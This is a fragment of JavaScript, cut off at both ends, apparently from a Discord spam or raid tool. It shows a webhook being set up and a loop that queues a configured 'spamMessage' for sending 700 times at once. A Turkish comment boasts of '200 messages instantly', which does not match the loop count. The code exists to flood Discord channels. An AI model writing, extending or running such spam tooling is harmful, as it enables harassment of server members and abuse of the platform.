            avatar: 'https://i.pinimg.com/736x/ec/10/df/ec10df93154cc37dbc24eb8c71fc1ebe.jpg'
        });

        // 200 MESAJ ANINDA!
        const promises = [];
        for (let i = 0; i < 700; i++) {
            promises.push(
                webhook.send({
                    content: config.spamMessage,
                    username: '',
                    avatarURL: 'https://i.pinimg.com/736x/ec/10/df/ec10df93154cc37dbc24eb8c71fc1ebe.jpg'
